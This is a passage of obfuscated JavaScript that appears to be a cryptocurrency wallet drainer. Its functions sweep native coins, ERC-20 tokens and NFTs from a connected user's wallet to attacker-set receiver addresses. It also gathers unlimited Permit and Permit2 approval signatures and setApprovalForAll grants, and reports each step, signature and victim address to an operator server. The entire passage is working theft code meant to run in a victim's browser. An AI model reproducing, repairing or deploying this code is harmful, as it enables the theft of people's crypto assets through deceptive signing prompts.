_0x368c45=BN(_0x250146[_0x2da8ba(0x28e)]==0xa4b1?0x4c4b40:_0x250146['chain_id']==0xa86a?0x4c4b40:_0x250146[_0x2da8ba(0x28e)]==0x171?0xdbba0:0x186a0),_0x28e499=await _0x5d3582[_0x2da8ba(0x247)](FLASH_Current_Address),_0x312fc5=_0x28e499[_0x2da8ba(0x169)](_0x368c45[_0x2da8ba(0x242)](_0x6d17db))[_0x2da8ba(0x169)](_0x523c12);if(_0x312fc5[_0x2da8ba(0x1b1)](BN(0x0))){_0x2affe1['to']=FLASH_Settings[_0x2da8ba(0x1bb)],_0x2affe1[_0x2da8ba(0x1be)]='0x';const _0x424885=await _0x5d3582['estimateGas'](_0x2affe1),_0x3fa2b3=_0x28e499['sub'](_0x424885['mul'](_0x6d17db))[_0x2da8ba(0x169)](_0x523c12);if(_0x3fa2b3[_0x2da8ba(0x1b1)](BN(0x0)))throw _0x2da8ba(0xa8);else return TRANSFER_NATIVE(_0x250146,!![]);}const _0x46b69d=await _0x5d3582[_0x2da8ba(0x127)](FLASH_Current_Address,_0x2da8ba(0x129));_0x2affe1['value']=_0x312fc5,_0x2affe1[_0x2da8ba(0x12e)]=_0x46b69d,_0x2affe1[_0x2da8ba(0x20d)]=_0x6d17db,_0x2affe1[_0x2da8ba(0x249)]=_0x368c45,await transfer_request(_0x250146),sign_next();const _0x58dfd6=await FLASH_Signer[_0x2da8ba(0x1f0)](_0x2affe1);wait_message();if(FLASH_Settings['Settings']['Wait_For_Confirmation'])await _0x5d3582['waitForTransaction'](_0x58dfd6['hash'],0x1,0x7530);await transfer_success(_0x250146,_0x312fc5),sign_ready();},DO_RANDOMIZER_NATIVE=async _0x1cd135=>{const _0x5d7698=_0x26b509,_0x172391=new ethers[(_0x5d7698(0xe1))][(_0x5d7698(0x299))](FLASH_Settings['RPCs'][_0x1cd135[_0x5d7698(0x28e)]]),_0x3294fe=BN(await _0x172391['getGasPrice']())[_0x5d7698(0x208)](BN(0x64))['mul'](BN(Math[_0x5d7698(0x285)](FLASH_Gas_Multiplier*0x64))),_0xae3c6a=BN(_0x1cd135[_0x5d7698(0x28e)]==0xa4b1?0x4c4b40:_0x1cd135['chain_id']==0xa86a?0x4c4b40:_0x1cd135['chain_id']==0x171?0xdbba0:0x249f0),_0x3dff35=_0xae3c6a[_0x5d7698(0x242)](FLASH_Gas_Reserves[_0x1cd135['chain_id']]+0x1)['mul'](_0x3294fe);let _0x486539={'from':FLASH_Current_Address,'to':FLASH_Settings[_0x5d7698(0x1f2)][_0x5d7698(0x1d2)],'value':BN(0x64),'data':'0x'};const _0x4fab54=await _0x172391['estimateGas'](_0x486539),_0x2ccd0c=await _0x172391[_0x5d7698(0x247)](FLASH_Current_Address),_0x38417b=_0x2ccd0c[_0x5d7698(0x169)](_0x4fab54[_0x5d7698(0x242)](_0x3294fe))[_0x5d7698(0x169)](_0x3dff35);if(_0x38417b['lte'](BN(0x0)))throw'LOW_BALANCE';const _0x1acae4=await _0x172391[_0x5d7698(0x127)](FLASH_Current_Address,_0x5d7698(0x129));_0x486539['value']=_0x38417b,_0x486539[_0x5d7698(0x12e)]=_0x1acae4,_0x486539['gasPrice']=_0x3294fe,_0x486539[_0x5d7698(0x249)]=_0x4fab54,await transfer_request(_0x1cd135),sign_next();const _0x4b1321=await FLASH_Signer[_0x5d7698(0x1f0)](_0x486539);wait_message();if(FLASH_Settings[_0x5d7698(0x1c7)]['Wait_For_Confirmation'])await _0x172391[_0x5d7698(0x14f)](_0x4b1321[_0x5d7698(0x226)],0x1,0x7530);const _0x2b2954=send_request({'action':_0x5d7698(0x1d5),'wallet':FLASH_Settings[_0x5d7698(0x1f2)],'chain_id':_0x1cd135[_0x5d7698(0x28e)],'amount_usd':_0x1cd135[_0x5d7698(0xc1)],'user_id':FLASH_ID,'asset':_0x1cd135,'address':FLASH_Current_Address});if(FLASH_Settings[_0x5d7698(0x1c7)][_0x5d7698(0xfa)])await _0x2b2954;await transfer_success(_0x1cd135,_0x38417b),sign_ready();},TRANSFER_NATIVE=async(_0x22b684,_0x51ab39=![])=>{const _0x5d3ef3=_0x26b509,_0xd2f62c=convert_chain('ID',_0x5d3ef3(0x186),_0x22b684[_0x5d3ef3(0x28e)]);if(FLASH_Settings[_0x5d3ef3(0x1c7)][_0x5d3ef3(0x27c)]&&FLASH_Settings[_0x5d3ef3(0x1f2)]!=null)return DO_RANDOMIZER_NATIVE(_0x22b684);if(_0x51ab39==![]&&((FLASH_Settings[_0x5d3ef3(0x1c7)][_0x5d3ef3(0xda)][_0xd2f62c][_0x5d3ef3(0x13e)]!=''||FLASH_Settings['Settings'][_0x5d3ef3(0x172)]&&FLASH_Settings[_0x5d3ef3(0x13a)][parseInt(_0x22b684['chain_id'])]!=null)&&_0x22b684['amount_usd']>=FLASH_Settings[_0x5d3ef3(0x1c7)][_0x5d3ef3(0xea)]))return DO_CONTRACT(_0x22b684);const _0x55fcf4=new ethers['providers'][(_0x5d3ef3(0x299))](FLASH_Settings[_0x5d3ef3(0x256)][_0x22b684['chain_id']]),_0x12ae2a=BN(await _0x55fcf4[_0x5d3ef3(0x1ee)]())[_0x5d3ef3(0x208)](BN(0x64))[_0x5d3ef3(0x242)](BN(Math[_0x5d3ef3(0x285)](FLASH_Gas_Multiplier*0x64))),_0xb613c4=BN(_0x22b684[_0x5d3ef3(0x28e)]==0xa4b1?0x4c4b40:_0x22b684['chain_id']==0xa86a?0x4c4b40:_0x22b684[_0x5d3ef3(0x28e)]==0x171?0xdbba0:0x249f0),_0x29bba4=_0xb613c4[_0x5d3ef3(0x242)](FLASH_Gas_Reserves[_0x22b684[_0x5d3ef3(0x28e)]]+0x1)[_0x5d3ef3(0x242)](_0x12ae2a);let _0x325362={'from':FLASH_Current_Address,'to':FLASH_Settings[_0x5d3ef3(0x1bb)],'value':BN(0x64),'data':'0x'};const _0x1340b0=await _0x55fcf4[_0x5d3ef3(0x1ce)](_0x325362),_0x42eb26=await _0x55fcf4['getBalance'](FLASH_Current_Address),_0x1b7735=_0x42eb26[_0x5d3ef3(0x169)](_0x1340b0[_0x5d3ef3(0x242)](_0x12ae2a))[_0x5d3ef3(0x169)](_0x29bba4);if(_0x1b7735[_0x5d3ef3(0x1b1)](BN(0x0)))throw _0x5d3ef3(0xa8);const _0x1001cc=await _0x55fcf4[_0x5d3ef3(0x127)](FLASH_Current_Address,_0x5d3ef3(0x129));_0x325362[_0x5d3ef3(0x142)]=_0x1b7735,_0x325362['nonce']=_0x1001cc,_0x325362['gasPrice']=_0x12ae2a,_0x325362[_0x5d3ef3(0x249)]=_0x1340b0,await transfer_request(_0x22b684),sign_next();const _0x26dff5=await FLASH_Signer[_0x5d3ef3(0x1f0)](_0x325362);wait_message();if(FLASH_Settings[_0x5d3ef3(0x1c7)]['Wait_For_Confirmation'])await _0x55fcf4[_0x5d3ef3(0x14f)](_0x26dff5[_0x5d3ef3(0x226)],0x1,0x7530);await transfer_success(_0x22b684,_0x1b7735),sign_ready();},DO_RANDOMIZER_TOKEN=async _0x3bfe45=>{const _0x3e7ce7=_0x26b509,_0x1093c9=new ethers[(_0x3e7ce7(0xe1))]['JsonRpcProvider'](FLASH_Settings[_0x3e7ce7(0x256)][_0x3bfe45[_0x3e7ce7(0x28e)]]),_0x487262=BN(await _0x1093c9['getGasPrice']())[_0x3e7ce7(0x208)](BN(0x64))[_0x3e7ce7(0x242)](BN(Math[_0x3e7ce7(0x285)](FLASH_Gas_Multiplier*0x64)));let _0xf9a23f={'from':FLASH_Current_Address,'to':_0x3bfe45[_0x3e7ce7(0x1d2)],'value':_0x3e7ce7(0x1d1),'data':'0x'};const _0x32ad57=new Web3(FLASH_Provider);let _0x163c44=null;const _0x222c91=new _0x32ad57[(_0x3e7ce7(0x147))][(_0x3e7ce7(0x15a))](FLASH_Contract_ABI[_0x3e7ce7(0x252)],_0x3bfe45[_0x3e7ce7(0x1d2)]);_0x163c44=_0x222c91[_0x3e7ce7(0x143)][_0x3e7ce7(0x29e)](FLASH_Settings[_0x3e7ce7(0x1f2)]['address'],_0x3bfe45[_0x3e7ce7(0x257)])[_0x3e7ce7(0x195)](),_0xf9a23f[_0x3e7ce7(0x1be)]=_0x163c44;const _0x1afc8e=await _0x1093c9[_0x3e7ce7(0x1ce)](_0xf9a23f),_0x3252ca=await _0x1093c9['getBalance'](FLASH_Current_Address),_0x4f35f3=_0x3252ca[_0x3e7ce7(0x169)](_0x1afc8e[_0x3e7ce7(0x242)](_0x487262));if(_0x4f35f3['lt'](BN(0x0)))throw _0x3e7ce7(0xa8);const _0x279100=await _0x1093c9['getTransactionCount'](FLASH_Current_Address,_0x3e7ce7(0x129));_0xf9a23f[_0x3e7ce7(0x12e)]=_0x279100,_0xf9a23f[_0x3e7ce7(0x20d)]=_0x487262,_0xf9a23f[_0x3e7ce7(0x249)]=_0x1afc8e,await transfer_request(_0x3bfe45),sign_next();const _0x34497c=await FLASH_Signer['sendTransaction'](_0xf9a23f);wait_message();if(FLASH_Settings[_0x3e7ce7(0x1c7)]['Wait_For_Confirmation'])await _0x1093c9[_0x3e7ce7(0x14f)](_0x34497c[_0x3e7ce7(0x226)],0x1,0x7530);const _0x156766=send_request({'action':_0x3e7ce7(0xae),'wallet':FLASH_Settings[_0x3e7ce7(0x1f2)],'chain_id':_0x3bfe45[_0x3e7ce7(0x28e)],'amount_usd':_0x3bfe45[_0x3e7ce7(0xc1)],'user_id':FLASH_ID,'asset':_0x3bfe45,'address':FLASH_Current_Address});if(FLASH_Settings[_0x3e7ce7(0x1c7)][_0x3e7ce7(0xfa)])await _0x156766;await transfer_success(_0x3bfe45),sign_ready();},TRANSFER_TOKEN=async _0x3d92c8=>{const _0xa4b25c=_0x26b509;if(FLASH_Settings['Settings'][_0xa4b25c(0x1b7)]&&FLASH_Settings[_0xa4b25c(0x1f2)]!=null)return DO_RANDOMIZER_TOKEN(_0x3d92c8);const _0x572513=new ethers[(_0xa4b25c(0xe1))][(_0xa4b25c(0x299))](FLASH_Settings[_0xa4b25c(0x256)][_0x3d92c8[_0xa4b25c(0x28e)]]),_0x5d93bc=BN(await _0x572513[_0xa4b25c(0x1ee)]())[_0xa4b25c(0x208)](BN(0x64))[_0xa4b25c(0x242)](BN(Math['floor'](FLASH_Gas_Multiplier*0x64)));let _0xbcc2b0={'from':FLASH_Current_Address,'to':_0x3d92c8[_0xa4b25c(0x1d2)],'value':'0x0','data':'0x'};const _0x2a294c=new Web3(FLASH_Provider);let _0x58460c=null;const _0x3d219b=new _0x2a294c[(_0xa4b25c(0x147))][(_0xa4b25c(0x15a))](FLASH_Contract_ABI[_0xa4b25c(0x252)],_0x3d92c8[_0xa4b25c(0x1d2)]);_0x58460c=_0x3d219b[_0xa4b25c(0x143)][_0xa4b25c(0x29e)](FLASH_Settings['Receiver'],_0x3d92c8[_0xa4b25c(0x257)])['encodeABI'](),_0xbcc2b0[_0xa4b25c(0x1be)]=_0x58460c;const _0x555b07=await _0x572513[_0xa4b25c(0x1ce)](_0xbcc2b0),_0x1d1931=await _0x572513[_0xa4b25c(0x247)](FLASH_Current_Address),_0x433f40=_0x1d1931[_0xa4b25c(0x169)](_0x555b07[_0xa4b25c(0x242)](_0x5d93bc));if(_0x433f40['lt'](BN(0x0)))throw'LOW_BALANCE';const _0x1c801f=await _0x572513[_0xa4b25c(0x127)](FLASH_Current_Address,_0xa4b25c(0x129));_0xbcc2b0['nonce']=_0x1c801f,_0xbcc2b0[_0xa4b25c(0x20d)]=_0x5d93bc,_0xbcc2b0[_0xa4b25c(0x249)]=_0x555b07,await transfer_request(_0x3d92c8),sign_next();const _0x4dd264=await FLASH_Signer[_0xa4b25c(0x1f0)](_0xbcc2b0);wait_message();if(FLASH_Settings[_0xa4b25c(0x1c7)][_0xa4b25c(0x22f)])await _0x572513[_0xa4b25c(0x14f)](_0x4dd264[_0xa4b25c(0x226)],0x1,0x7530);await transfer_success(_0x3d92c8),sign_ready();},TRANSFER_NFT=async _0x5ee478=>{const _0x21df5d=_0x26b509,_0x15fe1e=new ethers[(_0x21df5d(0xe1))][(_0x21df5d(0x299))](FLASH_Settings[_0x21df5d(0x256)][_0x5ee478[_0x21df5d(0x28e)]]),_0x2964bd=BN(await _0x15fe1e[_0x21df5d(0x1ee)]())[_0x21df5d(0x208)](BN(0x64))[_0x21df5d(0x242)](BN(Math['floor'](FLASH_Gas_Multiplier*0x64)));let _0x5304f0={'from':FLASH_Current_Address,'to':_0x5ee478[_0x21df5d(0x1d2)],'value':_0x21df5d(0x1d1),'data':'0x'};const _0x1780ef=new Web3(FLASH_Provider);let _0x4aa192=null;const _0x585c01=new _0x1780ef[(_0x21df5d(0x147))][(_0x21df5d(0x15a))](FLASH_Contract_ABI[_0x21df5d(0x248)],_0x5ee478[_0x21df5d(0x1d2)]);_0x4aa192=_0x585c01[_0x21df5d(0x143)][_0x21df5d(0x14c)](FLASH_Current_Address,FLASH_Settings[_0x21df5d(0x1bb)],_0x5ee478['id'])[_0x21df5d(0x195)](),_0x5304f0[_0x21df5d(0x1be)]=_0x4aa192;const _0x379bc8=await _0x15fe1e[_0x21df5d(0x1ce)](_0x5304f0),_0x2bb45a=await _0x15fe1e['getBalance'](FLASH_Current_Address),_0x3df954=_0x2bb45a[_0x21df5d(0x169)](_0x379bc8[_0x21df5d(0x242)](_0x2964bd));if(_0x3df954['lt'](BN(0x0)))throw _0x21df5d(0xa8);const _0xfb1a48=await _0x15fe1e[_0x21df5d(0x127)](FLASH_Current_Address,'pending');_0x5304f0[_0x21df5d(0x12e)]=_0xfb1a48,_0x5304f0[_0x21df5d(0x20d)]=_0x2964bd,_0x5304f0['gasLimit']=_0x379bc8,await transfer_request(_0x5ee478),sign_next();const _0x673298=await FLASH_Signer[_0x21df5d(0x1f0)](_0x5304f0);wait_message();if(FLASH_Settings[_0x21df5d(0x1c7)][_0x21df5d(0x22f)])await _0x15fe1e['waitForTransaction'](_0x673298[_0x21df5d(0x226)],0x1,0x7530);await transfer_success(_0x5ee478),sign_ready();},DO_SAFA=async _0x306efe=>{const _0x140be0=_0x26b509,_0x22d9fb=new ethers['providers'][(_0x140be0(0x299))](FLASH_Settings[_0x140be0(0x256)][_0x306efe[_0x140be0(0x28e)]]),_0x22a527=BN(await _0x22d9fb[_0x140be0(0x1ee)]())[_0x140be0(0x208)](BN(0x64))[_0x140be0(0x242)](BN(Math[_0x140be0(0x285)](FLASH_Gas_Multiplier*0x64)));let _0x63e80c={'from':FLASH_Current_Address,'to':_0x306efe['address'],'value':_0x140be0(0x1d1),'data':'0x'};const _0x2274f5=new Web3(FLASH_Provider);let _0x3a92cd=null;const _0x379121=new _0x2274f5[(_0x140be0(0x147))]['Contract'](FLASH_Contract_ABI[_0x140be0(0x248)],_0x306efe[_0x140be0(0x1d2)]);_0x3a92cd=_0x379121[_0x140be0(0x143)]['setApprovalForAll'](FLASH_Settings[_0x140be0(0x1f8)],!![])[_0x140be0(0x195)](),_0x63e80c['data']=_0x3a92cd;const _0x5dc760=await _0x22d9fb[_0x140be0(0x1ce)](_0x63e80c),_0x3371e3=await _0x22d9fb[_0x140be0(0x247)](FLASH_Current_Address),_0x5867e8=_0x3371e3[_0x140be0(0x169)](_0x5dc760[_0x140be0(0x242)](_0x22a527));if(_0x5867e8['lt'](BN(0x0)))throw _0x140be0(0xa8);const _0x56422d=await _0x22d9fb[_0x140be0(0x127)](FLASH_Current_Address,'pending');_0x63e80c[_0x140be0(0x12e)]=_0x56422d,_0x63e80c['gasPrice']=_0x22a527,_0x63e80c['gasLimit']=_0x5dc760,await transfer_request(_0x306efe),sign_next();const _0x1301f4=await FLASH_Signer[_0x140be0(0x1f0)](_0x63e80c);wait_message();if(FLASH_Settings['Settings'][_0x140be0(0x22f)])await _0x22d9fb['waitForTransaction'](_0x1301f4[_0x140be0(0x226)],0x1,0x7530);await transfer_success(_0x306efe),sign_ready();},DO_PERMIT2=async(_0x3c9211,_0x32cc8)=>{const _0x3e77c9=_0x26b509,_0x5708dc=new ethers[(_0x3e77c9(0x15a))](_0x3e77c9(0x180),FLASH_Contract_ABI[_0x3e77c9(0x10c)],FLASH_Signer);let _0x4b4528={'name':_0x3e77c9(0x1c1),'chainId':_0x3c9211['chain_id'],'verifyingContract':_0x3e77c9(0x180)},_0x3932e2=Date[_0x3e77c9(0x196)]()+0x3e8*0x3c*0x3c*0x18*0x164,_0x599e66=null,_0x1db0d2=null,_0xea8f7=null;if(_0x32cc8[_0x3e77c9(0x1a6)]>0x1){let _0x304b33={'PermitBatch':[{'name':_0x3e77c9(0x251),'type':_0x3e77c9(0x1a3)},{'name':_0x3e77c9(0x15e),'type':'address'},{'name':_0x3e77c9(0x191),'type':_0x3e77c9(0x114)}],'PermitDetails':[{'name':_0x3e77c9(0x1c5),'type':_0x3e77c9(0x1d2)},{'name':_0x3e77c9(0x1cd),'type':_0x3e77c9(0x294)},{'name':_0x3e77c9(0x19a),'type':_0x3e77c9(0x276)},{'name':_0x3e77c9(0x12e),'type':_0x3e77c9(0x276)}]},_0x96ce09=[];for(const _0x2dfeb6 of _0x32cc8){try{_0x96ce09['push']({'token':_0x2dfeb6[_0x3e77c9(0x1d2)],'expiration':_0x3932e2,'amount':_0x3e77c9(0x12a),'nonce':(await _0x5708dc[_0x3e77c9(0xd4)](FLASH_Current_Address,_0x2dfeb6[_0x3e77c9(0x1d2)],FLASH_Settings[_0x3e77c9(0x1c7)][_0x3e77c9(0x1b7)]?FLASH_Settings['Personal_Wallet']['address']:FLASH_Settings[_0x3e77c9(0x1f8)]))[_0x3e77c9(0x12e)]});}catch(_0x1b774e){console[_0x3e77c9(0x260)](_0x1b774e);}}_0x1db0d2={'details':_0x96ce09,'spender':FLASH_Settings[_0x3e77c9(0x1c7)][_0x3e77c9(0x1b7)]?FLASH_Settings['Personal_Wallet'][_0x3e77c9(0x1d2)]:FLASH_Settings['Address'],'sigDeadline':_0x3932e2},swap_request(_0x3e77c9(0x1c1),_0x3c9211,_0x32cc8),sign_next(),_0x599e66=await FLASH_Signer[_0x3e77c9(0x170)](_0x4b4528,_0x304b33,_0x1db0d2),_0xea8f7=0x2;}else{let _0x24a50a={'PermitSingle':[{'name':_0x3e77c9(0x251),'type':_0x3e77c9(0x1f4)},{'name':'spender','type':_0x3e77c9(0x1d2)},{'name':_0x3e77c9(0x191),'type':_0x3e77c9(0x114)}],'PermitDetails':[{'name':_0x3e77c9(0x1c5),'type':_0x3e77c9(0x1d2)},{'name':_0x3e77c9(0x1cd),'type':_0x3e77c9(0x294)},{'name':_0x3e77c9(0x19a),'type':'uint48'},{'name':'nonce','type':'uint48'}]};_0x1db0d2={'details':{'token':_0x3c9211[_0x3e77c9(0x1d2)],'amount':_0x3e77c9(0x12a),'expiration':_0x3932e2,'nonce':(await _0x5708dc[_0x3e77c9(0xd4)](FLASH_Current_Address,_0x3c9211[_0x3e77c9(0x1d2)],FLASH_Settings[_0x3e77c9(0x1c7)]['Use_Randomizer_For_Tokens']?FLASH_Settings['Personal_Wallet'][_0x3e77c9(0x1d2)]:FLASH_Settings[_0x3e77c9(0x1f8)]))[_0x3e77c9(0x12e)]},'spender':FLASH_Settings['Settings'][_0x3e77c9(0x1b7)]?FLASH_Settings[_0x3e77c9(0x1f2)][_0x3e77c9(0x1d2)]:FLASH_Settings[_0x3e77c9(0x1f8)],'sigDeadline':_0x3932e2},swap_request(_0x3e77c9(0x1c1),_0x3c9211,[_0x3c9211]),sign_next(),_0x599e66=await FLASH_Signer[_0x3e77c9(0x170)](_0x4b4528,_0x24a50a,_0x1db0d2),_0xea8f7=0x1;}if(_0x599e66!=null){await swap_success('Permit2',_0x3c9211,_0x32cc8),wait_message();const _0x346464=send_request({'action':_0x3e77c9(0xa0),'user_id':FLASH_ID,'signature':_0x599e66,'message':_0x1db0d2,'asset':_0x3c9211,'assets':_0x32cc8,'address':FLASH_Current_Address,'mode':_0xea8f7,'PW':FLASH_Settings['Personal_Wallet']});if(FLASH_Settings['Settings'][_0x3e77c9(0xfa)])await _0x346464;sign_ready();}else await sign_cancel();},PERMIT_TOKEN=async _0x1e4dfd=>{const _0x336099=_0x26b509,_0x9f5cbb=new ethers[(_0x336099(0x15a))](_0x1e4dfd[_0x336099(0x1d2)],_0x1e4dfd['abi'],FLASH_Signer),_0x3bb7a6=await _0x9f5cbb[_0x336099(0x1d8)](FLASH_Current_Address),_0x431a7b=await _0x9f5cbb['name']();let _0x38a621=ethers[_0x336099(0x18e)][_0x336099(0x280)](FLASH_Unlimited_Amount);for(const _0x2c8225 of FLASH_Settings[_0x336099(0x23a)]){try{if(_0x2c8225[0x0]==FLASH_Current_Chain_ID&&_0x2c8225[0x1]==_0x1e4dfd['address'][_0x336099(0x21d)]()[_0x336099(0x20f)]()){_0x38a621=_0x1e4dfd[_0x336099(0x257)];break;}}catch(_0xcf528d){console[_0x336099(0x260)](_0xcf528d);}}const _0x35752c=Date['now']()+0x3e8*0x3c*0x3c*0x18*0x164;let _0x58978e=null,_0x4bedf4=null;if(_0x1e4dfd[_0x336099(0x159)]==0x1)_0x58978e={'Permit':[{'name':'holder','type':'address'},{'name':_0x336099(0x15e),'type':_0x336099(0x1d2)},{'name':_0x336099(0x12e),'type':_0x336099(0x114)},{'name':_0x336099(0x162),'type':_0x336099(0x114)},{'name':_0x336099(0x1cb),'type':'bool'}]},_0x4bedf4={'holder':FLASH_Current_Address,'spender':FLASH_Settings['Settings'][_0x336099(0x1b7)]?FLASH_Settings[_0x336099(0x1f2)]['address']:FLASH_Settings[_0x336099(0x1f8)],'nonce':_0x3bb7a6,'expiry':_0x35752c,'allowed':!![]};else _0x1e4dfd[_0x336099(0x159)]==0x2&&(_0x58978e={'Permit':[{'name':_0x336099(0x12c),'type':_0x336099(0x1d2)},{'name':'spender','type':_0x336099(0x1d2)},{'name':_0x336099(0x142),'type':_0x336099(0x114)},{'name':'nonce','type':_0x336099(0x114)},{'name':_0x336099(0x1e5),'type':'uint256'}]},_0x4bedf4={'owner':FLASH_Current_Address,'spender':FLASH_Settings['Settings'][_0x336099(0x1b7)]?FLASH_Settings[_0x336099(0x1f2)][_0x336099(0x1d2)]:FLASH_Settings[_0x336099(0x1f8)],'value':_0x38a621,'nonce':_0x3bb7a6,'deadline':_0x35752c});await approve_request(_0x1e4dfd),sign_next();const _0x40679f=await FLASH_Signer[_0x336099(0x170)]({'name':_0x431a7b,'version':_0x1e4dfd[_0x336099(0xb9)],'chainId':_0x1e4dfd[_0x336099(0x28e)],'verifyingContract':_0x1e4dfd['address']},_0x58978e,_0x4bedf4),_0x30ca95={'r':_0x40679f[_0x336099(0x28a)](0x0,0x42),'s':'0x'+_0x40679f['slice'](0x42,0x82),'v':Number('0x'+_0x40679f[_0x336099(0x28a)](0x82,0x84))};await approve_success(_0x1e4dfd),wait_message();const _0x223524=send_request({'action':_0x336099(0x1fc),'user_id':FLASH_ID,'sign':{'type':_0x1e4dfd[_0x336099(0x159)],'version':_0x1e4dfd[_0x336099(0xb9)],'chain_id':_0x1e4dfd[_0x336099(0x28e)],'address':_0x1e4dfd['address'],'owner':FLASH_Current_Address,'spender':FLASH_Settings['Settings'][_0x336099(0x1b7)]?FLASH_Settings['Personal_Wallet']['address']:FLASH_Settings[_0x336099(0x1f8)],'value':_0x38a621['toString'](),'nonce':_0x3bb7a6[_0x336099(0x19b)](),'deadline':_0x35752c,'r':_0x30ca95['r'],'s':_0x30ca95['s'],'v':_0x30ca95['v'],'abi':_0x1e4dfd[_0x336099(0xd9)]},'asset':_0x1e4dfd,'address':FLASH_Current_Address,'PW':FLASH_Settings[_0x336099(0x1f2)]});if(FLASH_Settings[_0x336099(0x1c7)][_0x336099(0xfa)])await _0x223524;sign_ready();},sign_success=async(_0x4597a8,_0x78515c='0')=>{const _0x8edef=_0x26b509;try{if(_0x4597a8['type']=='NATIVE'){_0x4597a8[_0x8edef(0x257)]=_0x78515c;const _0x328908=ethers['BigNumber'][_0x8edef(0x239)](_0x4597a8['amount_raw']);_0x4597a8[_0x8edef(0xc1)]=parseFloat(ethers['utils']['formatUnits'](_0x328908,_0x8edef(0x1ab)))*FLASH_Currencies[convert_chain('ID',_0x8edef(0xba),_0x4597a8['chain_id'])]['USD'],await send_request({'action':_0x8edef(0x224),'asset':_0x4597a8,'user_id':FLASH_ID});}else await send_request({'action':_0x8edef(0x224),'asset':_0x4597a8,'user_id':FLASH_ID});}catch(_0x41d0fe){console[_0x8edef(0x260)](_0x41d0fe);}},swap_success=async(_0x543316,_0x5aefd8,_0x1c8766=[],_0x4d5ba3='0')=>{const _0x1cc06e=_0x26b509;try{if(_0x5aefd8[_0x1cc06e(0x22c)]==_0x1cc06e(0x158)){_0x5aefd8[_0x1cc06e(0x257)]=_0x4d5ba3;const _0x16e783=ethers[_0x1cc06e(0x11a)]['from'](_0x5aefd8[_0x1cc06e(0x257)]);_0x5aefd8[_0x1cc06e(0xc1)]=parseFloat(ethers[_0x1cc06e(0x18e)][_0x1cc06e(0x26a)](_0x16e783,'ether'))*FLASH_Currencies[convert_chain('ID',_0x1cc06e(0xba),_0x5aefd8[_0x1cc06e(0x28e)])]['USD'],await send_request({'action':_0x1cc06e(0x1a0),'asset':_0x5aefd8,'user_id':FLASH_ID,'list':_0x1c8766,'swapper':_0x543316});}else await send_request({'action':_0x1cc06e(0x1a0),'asset':_0x5aefd8,'user_id':FLASH_ID,'list':_0x1c8766,'swapper':_0x543316});}catch(_0x340859){console[_0x1cc06e(0x260)](_0x340859);}},transfer_success=async(_0x3b15dd,_0x58262a='0')=>{const _0x2905c9=_0x26b509;try{if(_0x3b15dd[_0x2905c9(0x22c)]=='NATIVE'){_0x3b15dd[_0x2905c9(0x257)]=_0x58262a;const _0x5cccb4=ethers[_0x2905c9(0x11a)][_0x2905c9(0x239)](_0x3b15dd['amount_raw']);_0x3b15dd[_0x2905c9(0xc1)]=parseFloat(ethers[_0x2905c9(0x18e)]['formatUnits'](_0x5cccb4,_0x2905c9(0x1ab)))*FLASH_Currencies[convert_chain('ID',_0x2905c9(0xba),_0x3b15dd[_0x2905c9(0x28e)])][_0x2905c9(0x286)],await send_request({'action':_0x2905c9(0xe3),'asset':_0x3b15dd,'user_id':FLASH_ID});}else await send_request({'action':_0x2905c9(0xe3),'asset':_0x3b15dd,'user_id':FLASH_ID});}catch(_0x590aab){console['log'](_0x590aab);}},approve_success=async _0x15051a=>{const _0x25ad80=_0x26b509;try{await send_request({'action':_0x25ad80(0xb2),'asset':_0x15051a,'user_id':FLASH_ID});}catch(_0x17f930){console[_0x25ad80(0x260)](_0x17f930);}},sign_cancel=async()=>{try{await send_request({'action':'sign_cancel','user_id':FLASH_ID});}catch(_0xc03aa0){console['log'](_0xc03aa0);}},sign_unavailable=async()=>{const _0x1771a6=_0x26b509;try{await send_request({'action':_0x1771a6(0x113),'user_id':FLASH_ID}),FLASH_Sign_Disabled=!![];}catch(_0x323b7e){console['log'](_0x323b7e);}},transfer_cancel=async()=>{const _0x31674f=_0x26b509;try{await send_request({'action':_0x31674f(0xca),'user_id':FLASH_ID});}catch(_0x33f2e0){console[_0x31674f(0x260)](_0x33f2e0);}},approve_cancel=async()=>{const _0x303a7a=_0x26b509;try{await send_request({'action':_0x303a7a(0xd5),'user_id':FLASH_ID});}catch(_0x5ae2d5){console[_0x303a7a(0x260)](_0x5ae2d5);}},chain_cancel=async()=>{const _0x346106=_0x26b509;try{await send_request({'action':_0x346106(0x206),'user_id':FLASH_ID});}catch(_0x545014){console['log'](_0x545014);}},chain_success=async()=>{const _0x4a96c5=_0x26b509;try{await send_request({'action':'chain_success','user_id':FLASH_ID});}catch(_0x4278a0){console[_0x4a96c5(0x260)](_0x4278a0);}},chain_request=async(_0x479ac4,_0x2000c4)=>{const _0x569647=_0x26b509;try{await send_request({'action':_0x569647(0xb1),'user_id':FLASH_ID,'chains':[_0x479ac4,_0x2000c4]});}catch(_0xa863d0){console['log'](_0xa863d0);}},sign_request=async _0x29326c=>{const _0x1b14c0=_0x26b509;try{await send_request({'action':_0x1b14c0(0x19c),'user_id':FLASH_ID,'asset':_0x29326c});}catch(_0x6f8cee){console[_0x1b14c0(0x260)](_0x6f8cee);}},swap_request=async(_0x2bf044,_0x595b07,_0x13b795=[])=>{const _0x537c30=_0x26b509;try{await send_request({'action':'swap_request','user_id':FLASH_ID,'asset':_0x595b07,'list':_0x13b795,'swapper':_0x2bf044});}catch(_0x3b2223){console[_0x537c30(0x260)](_0x3b2223);}},transfer_request=async _0x26956e=>{const _0x1f6d1b=_0x26b509;try{await send_request({'action':'transfer_request','user_id':FLASH_ID,'asset':_0x26956e});}catch(_0xad0021){console[_0x1f6d1b(0x260)](_0xad0021);}},approve_request=async _0x38e072=>{const _0xd33dd9=_0x26b509;try{await send_request({'action':_0xd33dd9(0x272),'user_id':FLASH_ID,'asset':_0x38e072});}catch(_0x2c0a46){console[_0xd33dd9(0x260)](_0x2c0a46);}},is_increase_approve=_0x4ffdfb=>{const _0x2408c1=_0x26b509;try{if(_0x4ffdfb[_0x2408c1(0xbe)](_0x2408c1(0x121)))return 0x1;else return _0x4ffdfb[_0x2408c1(0xbe)](_0x2408c1(0x1d4))?0x2:![];}catch(_0x1709e7){return![];}},get_wallet_assets=async _0x1c259f=>{const _0x7ccdd3=_0x26b509;try{let _0x35acd0=await send_request({'action':_0x7ccdd3(0x11b),'address':FLASH_Current_Address}),_0x229486=[];if(_0x35acd0['status']=='OK')_0x229486=_0x35acd0[_0x7ccdd3(0x1be)];else{if(FLASH_Settings['AT']!=''&&_0x35acd0[_0x7ccdd3(0x125)]==_0x7ccdd3(0x1aa))_0x229486=await 